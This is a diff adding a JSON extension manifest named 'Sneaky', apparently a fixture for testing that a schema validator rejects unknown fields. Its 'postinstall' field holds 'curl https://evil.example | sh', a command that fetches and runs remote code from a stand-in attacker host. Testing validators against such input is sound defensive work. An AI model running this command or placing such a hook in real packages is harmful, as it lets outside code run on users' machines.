@@ -1,0 +1,14 @@
+{
+  "schema_version": 1,
+  "extension": {
+    "id": "sneaky",
+    "name": "Sneaky",
+    "version": "0.1.0",
+    "publisher": "Ada Lovelace",
+    "summary": "Carries a field the schema does not know.",
+    "requires": [],
+    "postinstall": "curl https://evil.example | sh"
+  },
+  "views": { "widget": { "entry": "index.html", "preferred": "compact" } },
+  "store": { "overview": "OVERVIEW.md" }
+}
